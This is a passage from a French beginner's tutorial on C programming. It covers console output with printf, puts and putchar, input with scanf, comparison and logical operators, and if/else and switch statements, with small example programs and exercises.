par exemple des fonctions mathématiques) sur des variables ou encore d'écrire du texte à l'écran par exemple. Nous allons voir trois fonctions d'affichage de données dans ce chapitre, je nomme fièrement : printf pour écrire une chaîne de caractères formatée ; puts pour écrire une chaîne de caractères toute simple ; putchar pour écrire un caractère. printf — Écrire une chaîne de caractères de manière formatée La fonction printf affiche donc une chaîne de caractères (c'est à dire du texte) à l'écran. On l'utilise comme ceci : printf ( \"Votre texte...\" ); Cette fonction permet non seulement d'afficher des chaînes de caractères simples, mais également la valeur d'une variable passée en paramètre. Pour ce faire, il suffit d'utiliser un indicateur de conversion : il s'agit du caractère spécial % suivi d'une lettre qui varie en fonction du type de la variable. Voici les indicateurs de conversions de la norme C89 : Type Indicateurs de conversions char %c int %d long %ld short %hd float %f double %f long double %Lf unsigned int %u unsigned short %hu unsigned long %lu Après avoir inscrit un indicateur de conversion dans la chaîne de caractère (entre les guillemets), il faut indiquer de quelle variable il faut afficher la valeur. Il suffit de rajouter une virgule après les ces derniers, suivis du nom de la variable, comme ceci : printf(\"%[lettre]\", variable_a_afficher); Essayez donc d'afficher la valeur de la variable pi : /* Cette variable est constante (utilisation de « const ») car la valeur de pi ne change jamais */ const double pi = 3.1415926536 ; printf ( \"pi = %f\" , pi ); pi = 3.1415926536 C'est tout simple. Vous pouvez répéter ces opérations autant que fois que vous le voulez, il suffit de rajouter le symbole %[lettre] à chaque fois que vous souhaitez afficher la valeur d'une variable. Il n'y a aucune limite, voyez par exemple : double flottant = 19.75 ; int nombre = 10 , nombre_2 = 0 ; char lettre = 'a' ; nombre_2 = nombre * 3 ; printf ( \"nombre = %d, nombre_2 = %d, flottant = %f, lettre = %c\" , nombre , nombre_2 , flottant , lettre ); Amusez-vous à créer des variables et à en afficher la valeur pour voir si vous avez bien compris. Attention cependant, vous devez préciser la variable dont il faut afficher la valeur, sinon vous pouvez aller des valeurs fantaisistes au plantage du programme ! Le scoop du jour Devinez quoi, vous pouvez effectuer toutes sortes d'opérations à l'intérieur même de printf , comme des calculs par exemple. Quelques codes pour bien comprendre : printf ( \"%d | \" , 1 + 2 * 3 ); /* Affiche « 7 » */ printf ( \"%d | \" , ( 1 + 2 ) * 3 ); /* Affiche « 9 » */ printf ( \"%f | \" , - 1. + 2. * 4. / 3. ); /* Affiche « 1.666667 » */ printf ( \"%c\" , 'x' ); /* Affiche « x » */ 7 | 9 | 1.666667 | x Faites bien attention à mettre le « . », dans le cas contraire, le résultat serait faussé. Nous pouvons faire sensiblement la même chose avec des variables : int x = 42 , y = 21 ; printf ( \"%d\" , x * y / 2 ); 441 Tabulations et compagnie Afin d'afficher une tabulation ou encore un retour à la ligne, on utilise un caractère d'échappement . printf ( \"La valeur de la variable \\n\\t x est : %f \\n\\t y = %d\" , x , y ); La valeur de la variable x est : 42.424340 y = 1 '\\n' et '\\t' font partie de ces caractères. Voici un petit tableau qui en liste quelques-uns parmi les plus utilisés : Caractère d'échappement Signification '\\n' Retour à la ligne '\\t' Tabulation horizontale '\\r' Retour chariot '\\f' Saut de page '\\'' Affiche une apostrophe '\\\"' Affiche un guillemet '\\\\' Affiche un antislash '%%' Affiche un % Précision Si vous avez été attentifs, vous avez dû remarquer que lorsqu'on affiche un flottant il y a un certain nombre de zéros qui suivent, et ce peu importe s'ils sont utiles ou non. Heureusement, les programmeurs de la fonction printf ont pensé à tout. Afin de supprimer certains zéros inutiles, vous pouvez préciser la précision de l'affichage . Une précision, sous la forme d'un point ('.') suivi par un nombre, indique donc le nombre de chiffres qu'il y aura derrière la virgule. double x = 42.42734 ; printf ( \"%.2f\" , x ); 42.43 On remarque dans cet exemple un arrondi au centième. Il correspond au nombre indiqué lors de la précision de l'affichage. La variable n'a pas été modifiée, l'arrondi n'intervient que pour l'affichage. Pour finir, voici la chaîne de format (simplifiée) qu'utilise la fonction printf : % [ .précision ] indicateur de conversion Sur plusieurs lignes Plutôt qu'appeler plusieurs fois la fonction printf pour écrire du texte, on peut ne l'appeler qu'une fois et écrire plusieurs lignes. Pour cela, on utilise le signe \\ à chaque fin de ligne. Exemple : #include <stdio.h> int main ( void ) { printf ( \"Texte ecrit sur plusieurs \\ lignes dans le code source \\ et egalement dans la console.\" ); return 0 ; } Texte écrit sur plusieurs lignes dans le code source et également dans la console. L'inconvénient est que le texte affiché dans la console n'est pas parfaitement alignés. Il existe heureusement une autre possibilité : on peut écrire plusieurs phrases entre guillemets sans problème : #include <stdio.h> int main ( void ) { printf ( \"Texte ecrit sur plusieurs \" \"lignes dans le code source \" \"mais sur une seule dans la console.\" ); return 0 ; } Texte écrit sur plusieurs lignes dans le code source mais sur une seule dans la console. Ce qu'il faut retenir de ces deux méthodes, c'est que l'on est pas obligé d'appeler systématiquement printf pour afficher de nouvelles phrases, mais qu'au contraire il est possible d'en afficher plusieurs en n'utilisant qu'une fois la fonction. puts — Écrire une chaîne de caractères L'utilisation de la fonction puts est plus simple puisque elle ne se contente d'afficher que des chaînes de caractères simples. puts ( \"Salut les zeros !\" ); Cette fonction n'a pas de chaîne de format à évaluer comme printf , elle est donc plus simple à utiliser ainsi que (très légèrement) plus rapide à l'exécution. Ainsi, le code suivant ne fonctionnera pas : int var = 0 ; puts ( \"%d\" , var ); Je tiens à préciser que puts ajoute automatiquement une fin de ligne à la fin de la chaîne de caractères que vous souhaitez afficher. putchar — Écrire un caractère La fonction putchar affiche tout simplement un caractère. putchar ( 'c' ); On peut également afficher une variable de type char avec cette fonction. char caractere = 'Z' ; putchar ( caractere ); Interagir avec l'utilisateur Maintenant que nous savons déclarer, utiliser et même afficher des variables, nous sommes fin prêts pour interagir avec l'utilisateur. En effet, jusqu'à maintenant, on s'est contentés d'afficher des informations. Nous allons voir comment en récupérer grâce à la fonction scanf , dont l'utilisation est assez semblable à printf . scanf(\"%[lettre]\", &variable_dans_laquelle_on_va_mettre_notre_valeur); Souvenez-vous de la brève explication sur la mémoire au début du chapitre précédent. Celle-ci, je vous le rappelle, fonctionne comme une armoire avec des tiroirs (les adresses mémoires) et des objets dans ces tiroirs (nos variables). La fonction scanf a besoin de connaitre l'emplacement en mémoire de nos variables afin de les modifier. Afin d'effectuer cette opération, on utilise le symbole & . Ce concept de transmission d'adresses mémoires est un petit peu difficile à comprendre au début, ne vous inquiétez pas ; vous aurez l'occasion de bien revoir tout cela en profondeur dans le chapitre des pointeurs. Vous pouvez tester ce programme : int age ; puts ( \"Donnez votre age :\" ); /* Si vous oubliez le &, le programme plantera quand vous le lancerez, car vous tenterez d'accéder à une adresse mémoire inexistante ! */ scanf ( \"%d\" , & age ); printf ( \"Vous avez %d an(s) ! \\n \" , age ); Donnez votre age : 15 Vous avez 15 an(s) ! Ici, scanf attend patiemment que l'utilisateur saisisse un nombre au clavier afin de modifier la valeur contenue à l'adresse de age : on dit que c'est une fonction bloquante , puisqu'elle suspend l'exécution du programme tant que l'utilisateur n'a rien rentré. Ensuite, printf affiche bien ce qui est voulu. Les indicateurs de conversions sont peu différents de ceux de printf : Type Affichage Exemple char %c char lettre; scanf(\"%c\", &lettre); int %d int age; scanf(\"%d\", &age); long %ld long age; scanf(\"%ld\", &age); short %hd short age; scanf(\"%hd\", &age); float %f float taille; scanf(\"%f\", &taille); double %lf double taille; scanf(\"%lf\", &taille); long double %Lf long double taille; scanf(\"%Lf\", &taille); unsigned int %u unsigned int age; scanf(\"%u\", &age); unsigned short %hu unsigned short age scanf(\"%u\", &age); unsigned long %lu unsigned long age; scanf(\"%u\", &age); Vous pouvez utiliser cette fonction de différentes manières, vous pouvez lire plusieurs entrées en même temps, par exemple : int x , y ; scanf ( \"%d %d\" , & x , & y ); printf ( \"x = %d | y = %d \\n \" , x , y ); L'utilisateur a deux possibilités, soit d'insérer un espace, soit d'insérer un retour à la ligne : 14 6 x = 14 | y = 6 /* OU ENCORE */ 14 6 x = 14 | y = 6 La fonction scanf est en apparence simple, oui, je dis bien en apparence, car son utilisation peut devenir très complexe en sécurisant les entrées de l'utilisateur, par exemple. Cependant, à votre niveau, vous ne pouvez pas encore gérer le cas où l'utilisateur entre du texte à la place d'un nombre ; si cela arrive, votre programme aura de très fortes chances de planter. Ce n'est pas très grave, vous saurez en temps voulu comment gérer de manière avancée les entrées de l'utilisateur. Exercice Vous êtes prêts pour un exercice ? Essayez de coder une minicalculatrice qui : Dit bonjour ; Demande deux nombres entiers à l'utilisateur ; Les additionne, soustrait, multiplie et les divise (avec un arrondi au millième) ; Dit au revoir. Voici ce que ça pourrait donner : Bonjour ! Veuillez saisir le premier nombre : 4 Veuillez saisir le deuxième nombre : 7 Calculs : 4 + 7 = 11 4 - 7 = -3 4 * 7 = 28 4 / 7 = 0.571 Au revoir ! Essayez vraiment de réaliser ce petit programme sans aide, sans regarder le code de correction. Si besoin est, elle est ici . Vous y êtes arrivé sans problème ? Bravo ! Dans le cas contraire, ne vous inquiétiez pas, ce n'est pas grave. Relisez bien tous les points qui ne vous semblent pas clairs et ça devrait aller mieux. Maintenant, vous êtes capable de communiquer avec l'utilisateur. Cependant, nos actions sont encore un peu limitées. Nous verrons dans les prochains chapitres comment mieux réagir à ce que l'utilisateur communique. Les conditions Jusque-là, vous ne savez qu'écrire du texte, manipuler des nombres et interagir un tout petit peu avec l'utilisateur. En gros, pour le moment, un programme est quelque chose de sacrément stupide : il ne permet que d'exécuter des instructions dans l'ordre. Pour le moment, on ne sait faire que cela : faire des calculs simples dans un certain ordre. Notre ordinateur ne sert pas à grand chose de plus qu'une vulgaire calculette qu'on peut acheter n'importe où. Mine de rien, il serait sympathique de pouvoir faire plus de choses. Mais rassurez-vous : on peut faire mieux ! Les langages de programmation actuels fournissent des moyens permettant à notre programme de faire des choses plus évoluées et de pouvoir plus ou moins s'adapter aux circonstances au lieu de réagir machinalement. Pour rendre notre ordinateur \"plus intelligent\", on peut par exemple souhaiter que celui-ci n'exécute une suite d'instructions que si une certaine condition est remplie. Ou faire mieux : on peut demander à notre ordinateur de répéter une suite d'instructions tant qu'une condition bien définie est respectée. Pour ce faire, diverses structures de contrôle de ce type ont donc été inventées. Voici les plus utilisées et les plus courantes : ce sont celles qui reviennent de façon récurrente dans un grand nombre de langages de programmation actuels. On peut bien sûr en inventer d'autres, en spécialisant certaines structures de contrôle à des cas un peu plus particuliers ou en en inventant des plus évoluées. Nom de la structure de contrôle Ce qu'elle fait If...Then exécute une suite d'instructions si une condition est respectée. If...Then...Else exécute une suite d'instructions si une condition est respectée ou exécute une autre suite d'instructions si elle ne l'est pas. Switch exécute une suite d'instructions différente suivant la valeur testée. While...Do répète une suite d'instructions tant qu'une condition est respectée. Do...While répète une suite d'instructions tant qu'une condition est respectée. La différence, c'est que la boucle Do...While exécute au moins une fois cette suite d'instructions. For répète un nombre fixé de fois une suite d'instructions. Concevoir un programme (dans certains langages de programmation), c'est simplement créer une suite d'instructions, et utiliser ces fameuses structures de contrôle pour l'organiser. Ces structures de contrôle permettent donc de modifier le comportement du programme suivant la valeur de différentes conditions. Ainsi, si une condition est vraie, alors le programme se comportera d'une telle façon, si elle est fausse, le programme fera telle ou telle chose, etc. Notre ordinateur a donc besoin de deux choses pour exécuter ces structures de contrôle : des instructions pour évaluer ces conditions ; et des instructions qui vont faire reprendre notre processeur au bon endroit, en fonction du résultat de notre condition. Les première sont ce qu'on appelle des instructions de test. Les secondes sont ce qu'on appelle des instructions de branchement conditionnelles. Dans ce chapitre, on va voir comment utiliser les structures de contrôles les plus basiques disponibles en C, à savoir les trois premières structures de contrôle mentionnées dans le tableau du dessus. Nous allons aussi voir comment faire tester si une condition est vraie ou fausse à notre ordinateur. Conditions et booléens Il va de soit qu'avant de pouvoir utiliser des structures de contrôle, on doit pouvoir exprimer, écrire des conditions. Pour cela, le langage C fournit de quoi écrire quelques conditions de base. Divers opérateurs existent en C : ceux-ci permettent d'effectuer des comparaisons entre deux nombres. Ces opérateurs peuvent s'appliquer sur deux nombres écrits en dur dans le code, ou deux variables qui stockent un nombre. Ces opérateurs vont donc effectuer des comparaisons entre deux nombres, et vérifier si la comparaison est vraie ou fausse. Par exemple, ces opérateurs permettront de vérifier si une variable est supérieure à une autre, si deux variables sont égales, etc. Comparaisons L'écriture d'expression avec des opérateurs est similaire aux écritures mathématiques que vous voyez en cours : l'opérateur est entre les deux variables à comparer. On a donc une variable à gauche de l'opérateur, et une à droite. Pour donner un exemple, on va prendre l'opérateur de supériorité : l'opérateur >. Avec cet opérateur, on pourra écrire des expressions du style : a > b , qui vérifiera si la variable a est strictement supérieure à la variable b. Mais cet opérateur n'est pas le seul. Voici un tableau réunissant ses collègues : Symbole en langage C Signification == Est-ce que les deux variables testées sont égales ? != Est-ce que les deux variables testées sont différentes ? < Est-ce que la variable à gauche est strictement inférieure à celle de droite ? <= Est-ce que la variable à gauche est inférieure ou égale à celle de droite ? > Est-ce que la variable à gauche est strictement supérieure à celle de droite ? >= Est-ce que la variable à gauche est supérieure ou égale à celle de droite ? Ces opérateurs ne semblent pas très folichons : avec, on ne peut faire que quelques tests de conditions basiques sur des nombres. Mais pour un ordinateur, tout est nombre, et on peut donc se débrouiller avec ces opérateurs pour exprimer toutes les conditions que l'on veut : il suffira des les combiner entre eux, avec les bonnes valeurs à comparer. Vous verrez quand on passera à la pratique, cela sera plus clair. Dans les faits, le processeur de notre ordinateur possède souvent des instructions pour effectuer ces comparaisons. Vous pouvez parfaitement considérer que ces comparaisons peuvent être calculées directement par le processeur. Les booléens Comme je l'ai dit, ces opérateurs vont avoir un résultat : vrai si la condition est vérifiée, et faux si la condition est fausse. Mais notre ordinateur ne connait pas vrai ou faux : il ne connait que des suites de bits, des nombres ! Et on est alors obligé de coder, de représenter les valeurs \"vrai\" ou \"faux\" avec des nombres. Certains langages fournissent pour cela un type bien séparé pour stocker le résultat des opérations de comparaisons. La représentation des valeurs \"vrai\" et \"faux\" est ainsi gérée par le compilateur, et on peut travailler dans notre code en utilisant à la place des valeurs True (vrai en anglais) ou False (faux). Mais dans les premières versions du langage C, ce type spécial n'existe pas ! Il a donc fallu ruser et trouver une solution pour représenter les valeurs \"vrai\" et \"faux\". Pour cela, on a utilisé la méthode la plus simple : on utilise directement des nombres pour représenter ces deux valeurs. Ainsi, la valeur Faux est représentée par un nombre entier, tout comme la valeur Vrai. Le langage C impose que : Faux soit représenté par un zéro ; et que Vrai soit représenté par tout entier différent de zéro. Et nos opérations de comparaisons suivent cette règle pour représenter leur résultat. Ainsi, une opération de comparaison va renvoyer 0 si elle est fausse et renverra 1 si elle est vraie. Les opérateurs de comparaisons vérifient l'existence d'une certaine relation entre les valeurs qui lui sont associées (opérandes). Le résultat de cette vérification est égal à l'une de ces deux valeurs : 0, si la condition est logiquement fausse et 1 si en revanche elle est vraie. Exemple Vous ne me croyez pas ? Alors, vérifions quels sont les résultats renvoyés par diverses comparaisons. Par exemple, essayons avec le code suivant : int main ( void ) { printf ( \"10 == 20 renvoie %d \\n \" , 10 == 20 ); printf ( \"10 != 20 renvoie %d \\n \" , 10 != 20 ); printf ( \"10 < 20 renvoie %d \\n \" , 10 < 20 ); printf ( \"10 > 20 renvoie %d \\n \" , 10 > 20 ); return 0 ; } Le résultat : 10 == 20 renvoie 0 10 != 20 renvoie 1 10 < 20 renvoie 1 10 > 20 renvoie 0 Le résultat confirme bien ce que je vous ai dit ci-dessus : les résultats de ces conditions sont soit 0 si la comparaison effectuée est fausse, soit 1 si elle est vraie. Les opérateurs logiques Toutes ces comparaisons sont un peu faibles seules : il y a des choses qui ne sont pas possibles en utilisant une seule de ces comparaisons. Par exemple, on ne peut pas vérifier si un nombre est dans un intervalle en une seule comparaison. Supposons que pour une raison quelconque, je veuille vérifier que le contenu d'une variable de type int est compris entre 0 et 1000, 0 et 1000 non inclus. Je ne peux pas vérifier cela avec une seule comparaison (ou alors il faut vraiment ruser). On peut vérifier que notre entier est inférieur à 1000 OU qu'il est supérieur à zéro, mais pas les deux en même temps. Il nous faudrait donc trouver un moyen de combiner plusieurs comparaisons entre elles pour résoudre ce problème. Eh bien rassurez-vous : le langage C fournit de quoi combiner plusieurs résultats de comparaisons, plusieurs booléens. Il fournit pour cela ce qu'on appelle des opérateurs booléens , aussi appelés des opérateurs logiques . Les opérateurs logiques de base Il existe trois opérateurs logiques. L'opérateur ET, l'opérateur OU, et l'opérateur NON. Les opérateurs ET et OU vont permettre de combiner deux booléens. L'opérateur NON ne servira par contre pas à cela, comme vous allez le voir. Voyons plus en détail ces trois opérateurs. L'opérateur ET L'opérateur ET va manipuler deux booléens. Il va renvoyer \"vrai\" si les deux booléens sont vrais, et renverra faux sinon. Premier booléen Second booléen Résultat Faux Faux Faux Faux Vrai Faux Vrai Faux Faux Vrai Vrai Vrai Il permet par exemple de vérifier que deux comparaisons sont vraies en même temps : il suffit d'appliquer un opérateur ET sur les booléens renvoyés par les deux comparaisons pour que notre opérateur ET nous dise si les deux comparaisons sont vraies en même temps. Cet opérateur s'écrit &&. Il s'intercalera entre les deux comparaisons ou booléens à combiner. Par exemple, reprenons l'exemple vu plus haut, avec l'intervalle. Si je veux combiner les comparaisons a > 0 et a < 1000 , je devrais écrire ces deux comparaisons entièrement, et placer l'opérateur ET entre les deux. Ce qui fait que l'expression finale sera a > 0 && a < 1000 . L'opérateur OU L'opérateur OU fonctionne exactement comme l'opérateur ET : il prend deux booléens et les combines pour former un résultat. La différence c'est que l'opérateur OU ne vérifie pas que les deux booléens vrais en même temps. À la place, il va vérifier si un seul des booléens qu'il manipule est vrai. Si c'est le cas, il renverra \"vrai\". Dans les autres cas, il renverra \"Faux\". Premier booléen Second booléen Résultat Faux Faux Faux Faux Vrai Vrai Vrai Faux Vrai Vrai Vrai Vrai Cet opérateur s'écrit ||. Il s'intercalera entre les deux booléens ou les deux comparaisons à combiner. Pour donner un exemple, supposons que je veuille savoir si un nombre est divisible par 3 ou par 5, ou les deux. Pour cela, je vais devoir utiliser deux comparaisons : une qui vérifie si notre nombre est divisible par 3, et une autre qui vérifie s'il est divisible par 5. Ces conditions sont a % 3 == 0 pour le test de divisibilité par 3, et a % 5 == 0 pour le test de divisibilité par 5. Il reste juste à combiner les deux tests avec l'opérateur ||, ce qui donne : ( a % 3 == 0 ) || ( a % 5 == 0 ) . Vous remarquerez que j'ai placé des parenthèses pour plus de lisibilité. L'opérateur NON Cet opérateur est un peu spécial : il va manipuler un seul booléen, contrairement à ses confrères ET et OU. Son rôle est d'inverser ce dernier. Booléen Résultat Faux Vrai Vrai Faux Cet opérateur se note ! . Son utilité ? Simplifier certaines expressions. Par exemple, si je veux vérifier qu'un nombre n'est pas dans l'intervalle $] 0 , 1000 [$, on peut utiliser l'opérateur NON intelligemment. Je sais vérifier qu'un nombre est dans cet intervalle : il me suffit d'écrire l'expression a > 0 && a < 1000 , vu plus haut. Pour rappel, cette expression permet de vérifier qu'un nombre est dans cet intervalle. Pour vérifier la condition inverse, à savoir \"le nombre a n'est pas dans cet intervalle\", il suffit d'appliquer l'opérateur NON à cette expression. On obtient alors l'expression ! ( a > 0 && a < 1000 ) . Vous remarquerez que pour cet exemple, on peut se passer de l'opérateur NON en récrivant une expression plus légère, à savoir a <= 0 || a >= 1000 . C'est ainsi, on peut simplifier les expressions écrites avec des opérateurs logiques pour diminuer le nombre d'opérateurs utilisés. Cela sert pour simplifier l'écriture des calculs, ou gagner marginalement en performances lors des calculs des expressions utilisant ces opérateurs. Pour la culture générale, ces techniques de simplification servent aussi dans divers domaines de l'informatique, et même en électronique. Pour les curieux, il existe un tutoriel sur le sujet sur le Site du Zéro, accessible via ce lien : l'algèbre de Boole . Évaluation en court-circuit Dans les opérateurs logiques && et ||, on exécute obligatoirement la première comparaison avant la seconde. C'est toujours le cas : la norme du C impose de tester d'abord la première comparaison, puis d'effectuer la seconde. Ce n'est pas le cas dans d'autres langages, mais passons. Ce genre de détail permet à nos opérateurs && et || d'avoir un comportement assez intéressant, qui peut être utile dans certains cas pour éviter des calculs inutiles. Pour l'illustrer, je vais reprendre l'exemple utilisé plus haut : on veut vérifier qu'un entier est compris entre 0 et 1000 (0 et 1000 ne comptent pas, ne sont pas inclus dans l'intervalle voulu). On utilise pour cela l'expression logique a > 0 && a < 1000 . Et c'est là que les choses deviennent intéressantes. Supposons que a soit inférieur ou égal à zéro. Dans ce cas, on saura dès la première comparaison que notre entier n'est pas dans l'intervalle. On n'a pas besoin d'effectuer la seconde. Eh bien rassurez-vous : le langage C nous dit si jamais la première comparaison d'un && ou d'un || suffit à donner le bon résultat, la seconde comparaison n'est pas calculée. Par exemple, pour l'opérateur &&, on sait d'avance que si la première comparaison est fausse, la seconde n'est pas à calculer. En effet, l'opérateur ET ne renvoie vrai que si les deux comparaisons sont vraies. Si une seule d'entre elles renvoie faux, on pas besoin de calculer l'autre. Et vu que la première comparaison, celle de gauche, est celle effectuée ne premier, on est certain que si celle-ci renvoie faux, la seconde n'est pas calculée. Pour l'opérateur ||, c'est différent : la seconde comparaison n'est pas calculée quand la première comparaison est vraie. En effet, l'opérateur || renvoie vrai dès qu'une seule des deux comparaisons testées est vraie. Donc, si la première est vraie, pas besoin de calculer la seconde. Ce genre de propriétés des opérateurs && et || peut-être utilisée efficacement pour éviter de faire certains calculs. Il suffit de choisir intelligemment quelle comparaison mettre à gauche de l'opérateur, suivant la situation. Encore mieux ! Bien sûr, on peut aussi mélanger ces opérateurs pour créer des conditions encore plus complexes. Voici un exemple d'une expression logique plutôt complexe (et inutile, je l'ai créé uniquement pour l'exemple) : int nb_1 = 3 , nb_2 = 64 , nb_3 = 12 , nb_4 = 8 , nb_5 = - 5 , nb_6 = 42 ; int boolean = (( nb_1 < nb_2 && nb_2 > 32 ) || ( nb_3 < nb_4 + nb_2 || nb_5 == 0 )) && ( nb_6 > nb_4 ); printf ( \"La valeur logique est egale a : %d \\n \" , boolean ); Ici, la variable boolean est égale à 1, la condition est vrai. Comme vous le voyez, j'ai inséré des retours à la ligne pour la clarté du code. Parenthèses En regardant le code écrit plus haut, vous avez surement remarqué la présence de plusieurs parenthèses : celles-ci enlèvent toute ambigüité dans les expressions créées avec des opérateurs logiques. Et oui, en mathématiques on doit utiliser des parenthèses dans nos équations; et bien c'est pareil avec des expressions utilisant des opérateurs logiques. Par exemple, le code suivant : printf ( \"%d \\n \" , ( a && b ) || ( c && d ) ); Est différent de : printf ( \"%d \\n \" , a && ( b || c ) && d ); Pour être sûr d'avoir le résultat souhaité, ajoutez des parenthèses. La structure if Vous savez désormais manipuler les booléens, cela est certes très amusant, mais l'intérêt de la chose limité est assez limité pour le moment. Ils nous permettent de savoir si une ou plusieurs conditions sont respectées, mais reste à trouver un moyen pour exécuter un bloc d'instruction suivant le résultat de ces conditions. C'est le rôle de l'instruction if et de ses consœurs. L'instruction if L'instruction if sert à exécuter un bloc d'instructions si une expression logique ou une condition est vérifiée ou passe à la suite du programme si ce n'est pas le cas. L'instruction if ressemble à ceci : if ( /* Expression logique */ ) { /* Une ou plusieurs instructions */ } Si la condition testée par le if n'est pas vérifiée, le bloc d'instruction est zappé et le programme recommence immédiatement à la suite du bloc d'instruction délimité par l'instruction if . Si vous n'avez qu'une seule instruction à réaliser, vous avez la possibilité de ne pas mettre d'accolades. if ( /* Expression logique */ ) /* Une seule instruction */ Cependant, je vous conseille de mettre les accolades systématiquement afin de rendre vos codes plus clairs et de ne pas vous poser de problèmes si vous décidez de rajouter des instructions par la suite en oubliant d'ajouter des accolades. Bien sûr, ce n'est qu'un avis personnel, vous êtes libre de faire ce que vous voulez. Exemple numéro 1 Faisons un test : int nombre_1 = 10 , nombre_2 = 20 ; if ( nombre_1 < nombre_2 ) { printf ( \"%d est inferieur a %d \\n \" , nombre_1 , nombre_2 ); } La sortie de ce code est évidemment : 10 est inférieur à 20 L'instruction if évalue l'expression logique nombre_1 < nombre_2 , conclue qu'elle est valide, et exécute le bloc d'instruction. Exemple numéro 2 Maintenant, on va regarder ce qui se passe quand la condition testée dans notre if n'est pas valide. Essayez le code suivant : int nombre_1 = 10 , nombre_2 = 20 ; if ( nombre_1 > nombre_2 ) { printf ( \"%d est superieur a %d \\n\\n \" , nombre_1 , nombre_2 ); } Aucune surprise, puisque nombre_1 est inférieur à nombre_2 . La condition est fausse et le bloc d'instruction du if n'est pas exécuté. L'instruction else Avec notre instruction if , on sait exécuter un bloc d'instruction quand une condition est remplie. Mais c'est tout. Si l'on veut exécuter un bloc d'instruction alternatif dans le cas où la condition ne serait pas remplie, on doit rajouter une autre instruction if à la suite. if ( a > 5 ) { /* du code */ } if ( a <= 5 ) { /* code alternatif */ } Le seul problème, c'est qu'on doit rajouter un if et évaluer une nouvelle condition. Ce n'est pas très efficace et assez long à taper. Pour limiter les dégâts, le C fournit une autre instruction : l'instruction else , qui signifie \"sinon\". Celle-ci se place immédiatement après le bloc d'instruction d'un if . Elle permet d'exécuter un bloc d'instruction alternatif si la condition testée dans le if n'est pas remplie. Sa syntaxe est la suivante : if ( /*Expression logique*/ ) { /*Une ou plusieurs instructions*/ } else { /*Une ou plusieurs instructions*/ } Et elle doit être comprise comme ceci : L'instruction else ne possède aucune parenthèse, pensez-y lorsque vous programmez. Exemple Passons maintenant à la pratique : les exemples, il n'y a que cela de vrai. Supposons que je veuille créer un programme très simple, auquel on fourni une heure, et qui indique si il fait nuit ou jour à cette heure-ci. On suppose qu'il fait jour de 9 heures à 20 heures, et qu'il fait nuit sinon. J'obtiendrais ce résultat : int main ( void ) { int heure ; scanf ( \"%d\" , & heure ); if ( heure > 8 && heure < 20 ) { printf ( \"Il fait jour. \\n \" ); } else { printf ( \"Il fait nuit. \\n \" ); } return 0 ; } If / else if Nos instructions if et else sont très utiles. Et lorsqu'on les utilise, il arrive parfois que l'on imbrique plusieurs instructions if ou else les unes dans les autres. Ainsi, de tels codes sont possibles : if ( condition ) { /* du code */ } else { /* plusieurs instructions */ if ( autre condition ) { /* du code */ } } Ces codes sont assez longs à écrire, et de telles imbrications sont assez difficiles à lire quand beaucoup de if et de else sont imbriqués. Pour éviter ces inconvénients, on a inventé une instruction qui permet de simplifier l'écriture de certaines de ces imbrications. Il s'agit de l'instruction else if . Les imbrications simplifiables avec un else if sont celles qui s'écrivent comme ceci : if ( /*Expression logique*/ ) { /*Une ou plusieurs instructions*/ } else { if ( /*Expression logique*/ ) { /*Une ou plusieurs instructions*/ } } Faites bien attention : le bloc d'instruction du else doit contenir un if , éventuellement avec un else , mais rien d'autre. Celles-ci peuvent alors être simplifiées comme suit : if ( /*Expression logique*/ ) { /*Une ou plusieurs instructions*/ } else if ( /*Expression logique*/ ) { /*Une ou plusieurs instructions*/ } Tout se passe comme si on avait enlevé les accolades du else . De cette description, on peut facilement déduire qu'une instruction else if suit toujours un if ou un autre else if . Notre instruction else if va s'exécuter si le bloc d'instruction placé juste au-dessus de lui ne s'exécute pas. Si c'est le cas, il testera sa condition, et s'exécutera si celle-si est valide. Petite remarque : si on place une instruction if suivie de plusieurs else if (le tout éventuellement terminé par un else final), un seul bloc d'instruction sera exécuté : celui pour lequel la condition testée est vraie. Notre ordinateur va ainsi tester les conditions du if et des différents else if , jusqu'à tomber sur la bonne, et exécuter le bloc d'instruction qui correspond. Voyez par exemple : int main ( void ) { int heure = 11 ; if ( heure >= 7 && heure <= 12 ) { printf ( \"On est le matin ! \\n \" ); } else if ( heure >= 9 && heure <= 12 ) { printf ( \"Le petit dejeune, c'est fini ! \\n \" ); } else if ( heure < 7 || heure > 12 ) { printf ( \"On est soit l'aprem', soit le soir, soit la nuit. \\n \" ); } return 0 ; } 11 On est le matin ! Un petit exercice pour bien comprendre Imaginez que vous ayez un score de jeu vidéo sous la main : Si le score est inférieur à 2000, afficher « C'est la catastrophe » . Si le score est supérieur ou égal à 2000 et que le score est inférieur à 5000, afficher « Tu peux mieux faire » . Si le score est supérieur ou égal à 5000 et que le score est inférieur à 9000, afficher « Tu es sur la bonne voie » . Sinon, afficher « Tu es le meilleur ! » . À vous de codez ça. Si vous n'y arrivez pas, ce n'est pas grave, relisez simplement ce chapitre autant de fois que nécessaire. Voici la correction, regardez seulement après avoir essayé de faire l'exercice : int main ( void ) { int score ; printf ( \"Quel est le score du joueur : \" ); scanf ( \"%d\" , & score ); if ( score < 2000 ) { printf ( \"C'est la catastrophe \\n \" ); } else if ( score >= 2000 && score < 5000 ) { printf ( \"Tu peux mieux faire \\n \" ); } else if ( score >= 5000 && score < 9000 ) { printf ( \"Tu es sur la bonne voie \\n \" ); } else { printf ( \"Tu es le meilleur ! \\n \" ); } return 0 ; } L'instruction switch L'instruction switch permet de comparer successivement une variable à une ou plusieurs valeurs (ou comparants). Si la variable concorde avec telle ou telle valeur, on exécute la ou les instructions qui suivent. Cette instruction se présente sous la forme suivante : switch ( /* variable */ ) { case /* comparant_1 */ : /* Instructions */ break ; case /* comparant_2 */ : /* Instructions */ break ; /* Etc... */ default : /* Si aucune comparaison n'est juste */ /* Instruction(s) à exécuter dans ce cas */ break ; } Ce qu'il faut retenir, c'est que switch compare une variable à une liste de comparants. Chaque comparant est défini à l'aide d'un case . Si la comparaison est vraie, alors le switch exécute toutes les instructions jusqu'au prochain break (ce mot-clef permet de mettre fin à une itération, nous verrons cela plus en détail dans le prochain chapitre). Si aucune comparaison n'est bonne, alors ce sont les instructions associées au default qui seront exécutées. Voici un exemple dans lequel on compare la variable note à 0, 1, 2, 3, 4 et 5 : int main ( void ) { int note ; printf ( \"Quelle note as-tu obtenu : \" ); scanf ( \"%d\" , & note ); switch ( note ) { /* si note == 0 */ case 0 : puts ( \"No comment.\" ); break ; /* si note == 1 */ case 1 : puts ( \"Cela te fait 4/20, c'est accablant.\" ); break ; /* si note == 2 */ case 2 : puts ( \"On se rapproche de la moyenne, mais ce n'est pas encore ca.\" ); break ; /* si note == 3 */ case 3 : puts ( \"Tu passes.\" ); break ; /* si note == 4*/ case 4 